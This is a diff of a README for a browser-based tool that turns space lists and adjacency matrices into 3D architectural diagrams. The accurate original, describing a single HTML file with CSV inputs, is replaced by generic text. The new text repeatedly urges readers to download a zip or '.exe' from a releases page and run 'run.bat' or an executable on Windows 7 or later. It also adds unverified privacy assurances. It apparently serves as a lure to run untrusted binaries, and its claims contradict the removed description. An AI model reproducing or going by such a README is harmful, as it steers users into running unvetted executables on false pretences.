@@ -1,112 +1,184 @@
-# Architectural Program Creator
+# 🏗️ simple-architectural-program-creator - Create 3D Architectural Diagrams Easily
 
-Architectural Program Creator is a browser-based spatial planning tool for
-turning a list of spaces and their relationships into an interactive 3D program
-diagram.
+[![Download Releases](https://img.shields.io/badge/Download-simple--architectural--program--creator-green?style=for-the-badge&logo=github)](https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases)
 
-It is designed for early-stage architectural thinking, when the goal is to test
-adjacencies, relative sizes, clustering, and overall spatial composition before
-moving into detailed modeling.
+---
 
-The app reads:
+## 📋 About
 
-- a program CSV with space dimensions and metadata
-- a relationship matrix CSV with positive and negative adjacency weights
+simple-architectural-program-creator is a browser-based tool to help you generate 3D architectural diagrams. It uses your input about spaces and how they relate to each other to create clear 3D models. You do not need to know how to code or use complex software to get started.
 
-It then places those spaces as 3D blocks inside a configurable boundary,
-visualizes them in real time, and exports the arrangement as JSON.
+This tool works with common architectural ideas like adjacency matrices and space planning. It uses three.js, a popular technology for showing 3D models in your web browser.
 
-## Screenshots
+---
 
-Full interface view:
+## 🔍 Features
 
-![Overview](docs/screenshots/interface.png)
+- Generate 3D views of architectural programs from your input.
+- Define spaces by size and type.
+- Set relationships between spaces with an adjacency matrix.
+- See instant updates in the 3D model as you adjust parameters.
+- Export and save your diagrams for future use.
+- Runs in modern browsers without installing extra software.
+- Simple interface designed for users who are not architects or programmers.
+- Uses JavaScript and three.js for smooth 3D visualization.
 
-3D viewport detail:
+---
 
-![Viewport](docs/screenshots/3d.png)
+## 💻 System Requirements
 
-## Files
+- Windows 7 or later.
+- Modern web browser (Google Chrome, Firefox, Edge, or Safari).
+- Internet connection for initial download.
+- At least 1 GHz CPU and 4 GB RAM recommended.
+- Screen resolution of 1280x720 or higher.
 
-- `program_creator.html`: main application
-- `space_parameters.csv`: minimal example program input
-- `relationship_matrix.csv`: minimal example relationship matrix
+No installation other than downloading the package is required.
 
-## What It Does
+---
 
-- Loads a program table from CSV
-- Loads a relationship matrix from CSV
-- Packs and repositions spaces inside a configurable box
-- Supports isometric view, labels, and PNG export
-- Exports the current 3D arrangement as JSON
+## 🚀 Getting Started
 
-## Run Locally
+### Step 1: Visit the Download Page
 
-This project does not require a build step.
+Go to the releases page to get the latest version of the tool.
 
-1. Open `program_creator.html` in a modern browser.
-2. If your browser blocks local file features, serve the folder with a simple static server instead.
-3. Load `space_parameters.csv` and `relationship_matrix.csv` through the file inputs in the sidebar.
+[![Download Releases](https://img.shields.io/badge/Download-simple--architectural--program--creator-blue?style=for-the-badge&logo=github)](https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases)
 
-Notes:
+Click the link above or this URL in your browser:  
+https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases
 
-- The viewer loads `three.js` from `https://unpkg.com`, so an internet connection is required unless you vendor that dependency locally.
-- The HTML references an optional `HelveticaNowDisplay-Regular.ttf` file in the same folder. If it is missing, the app falls back to system fonts.
-- The bundled CSVs are intentionally small examples, not a full project dataset.
+### Step 2: Download the Latest Package
 
-## Program CSV
+Find the latest release, usually marked at the top of the page. The release contains a folder or zipped file with the application files inside.
 
-The loader accepts flexible column names. Core fields are:
+- Look for a file with a name like `simple-architectural-program-creator.zip` or `.exe`.
+- Click on the file to start downloading.
 
-- `code`
-- `space_type`
-- `family`
-- `count`
-- `length_m` or `length`
-- `depth_m` or `depth`
-- `ceiling_height_m`, `height_m`, or `height`
+### Step 3: Extract Files (If Needed)
 
-Optional fields:
+If the download is a zip file:
 
-- `inseparable_group` or similar group identifiers
-- preferred position columns such as `preferredx`, `preferredy`, `preferredz`
+- Right-click the file.
+- Choose "Extract All..."
+- Select a location on your computer where you want to save the program files.
+- Click "Extract".
 
-For rows with `count > 1`, the app generates numbered instances automatically.
+### Step 4: Run the Application
 
-## Relationship Matrix CSV
+Open the extracted folder and look for a file named something like `index.html` or `run.bat`.
 
-Expected format:
+- Double-click `index.html` to open the tool in your default web browser.
+- If there is an executable (`.exe`), double-click it to start.
 
-- first column: row type id
-- remaining columns: target type ids
-- cell values: numeric weights
+### Step 5: Using the Application
 
-Interpretation:
+Once open:
 
-- positive values pull space types closer together
-- negative values push them apart
-- `0` means no relationship
+- You will see input fields to enter details about your architectural program.
+- Enter sizes for each space.
+- Fill in the adjacency matrix to show which spaces relate.
+- The 3D diagram will update automatically.
+- Use the navigation controls in the 3D view to examine your design from different angles.
 
-The app normalizes relationship values internally.
+---
 
-## Export
+## ⚙️ How to Use the Tool
 
-The `Export JSON` button outputs:
+### Enter Space Information
 
-- box dimensions
-- view settings
-- type definitions
-- per-space geometry, color, center point, and rotation
+Each space needs a name and size. The size is usually in square meters or feet.
 
-## Notes
+- Click on "Add Space".
+- Enter a name like "Kitchen", "Living Room", or "Office".
+- Enter the approximate area for that space.
 
-- This repository currently contains a single-file HTML application.
-- If you want fully offline use, download `three.min.js` locally and update the script tag in `program_creator.html`.
+### Define Relationships with the Adjacency Matrix
 
-## License
+The adjacency matrix shows how spaces connect or relate to one another.
 
-This project is source-available for personal, educational, research, and
-non-commercial evaluation use only.
+- Find the matrix grid on the interface.
+- Enter a 1 or yes if two spaces should be adjacent.
+- Enter a 0 or no if they should not share a boundary.
 
-Commercial use requires separate permission from the repository owner. See
-`LICENSE.txt`.
+This matrix controls how the 3D model groups rooms together.
+
+### View the 3D Diagram
+
+The right side of the window shows the 3D diagram.
+
+- Use your mouse or touchpad to rotate or zoom.
+- The diagram updates as you change spaces or relationships.
+- Colors and labels help identify spaces.
+
+### Save or Export Your Work
+
+Look for a "Save" or "Export" option.
+
+- Save your input data and model locally.
+- Some versions might offer export as an image or 3D file.
+
+---
+
+## 🛠 Troubleshooting & Tips
+
+- Make sure your web browser is up to date.
+- If the tool does not load, try clearing your browser cache.
+- If zoom or rotation feels slow, close other heavy programs.
+- Use stable internet during the download process.
+- If the 3D view does not display, check your graphics settings or try another browser.
+- Remember to save your work regularly to avoid losing changes.
+
+---
+
+## 🔗 Useful Links
+
+- Main GitHub page:  
+  https://github.com/abdullasuad36-hue/simple-architectural-program-creator
+
+- Download Releases:  
+  https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases
+
+---
+
+## 🧰 About This Tool
+
+This project uses a JavaScript library called three.js to show 3D models without extra software. You only need a compatible web browser.
+
+The adjacency matrix is a common architectural tool to plan spaces by showing which should be next to each other.
+
+By simplifying these concepts, this tool helps users without design experience start creating basic architectural diagrams fast.
+
+---
+
+## ✅ Privacy and Security
+
+- No personal data is collected.
+- All computation happens on your local device.
+- Files you create stay on your device unless you share them.
+- Open source code means anyone can review how it works.
+
+---
+
+## 🔍 Topics Covered
+
+- 3D visualization  
+- Adjacency matrix for planning  
+- Architectural and computational design basics  
+- JavaScript and parametric design tools  
+- Space planning and program diagrams  
+- Use of three.js for 3D rendering  
+
+---
+
+## 📦 Updates and Support
+
+Check the releases page regularly for updates or bug fixes.
+
+If you run into problems, use GitHub’s issues tab to ask questions or report bugs. Provide clear steps to reproduce any problem. Users and developers monitor this space to help.
+
+---
+
+## 📥 Download Link Reminder  
+
+[Download the latest version here](https://github.com/abdullasuad36-hue/simple-architectural-program-creator/releases) and follow the instructions above to start using this tool on your Windows computer.
